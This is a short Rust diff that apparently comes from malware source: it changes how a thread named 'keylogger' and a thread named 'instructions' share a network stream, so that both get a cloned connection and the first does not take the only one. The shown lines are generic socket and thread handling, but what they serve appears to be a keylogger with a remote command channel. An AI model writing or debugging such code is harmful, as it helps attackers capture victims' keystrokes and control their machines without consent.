@@ -45,8 +45,8 @@ fn main() {
     let stream_clone = Arc::clone(&stream);
     let keylogger = thread::spawn(move || {
         let stream = {
-            let mut guard = stream_clone.lock().unwrap();
-            guard.take()
+            let guard = stream_clone.lock().unwrap();
+            guard.as_ref().and_then(|s| s.try_clone().ok())
         };
 
         let Some(stream) = stream else {
@@ -59,8 +59,8 @@ fn main() {
     let stream_clone = Arc::clone(&stream);
     let instructions = thread::spawn(move || {
         let stream = {
-            let mut guard = stream_clone.lock().unwrap();
-            guard.take()
+            let guard = stream_clone.lock().unwrap();
+            guard.as_ref().and_then(|s| s.try_clone().ok())
         };
 
         let Some(stream) = stream else {
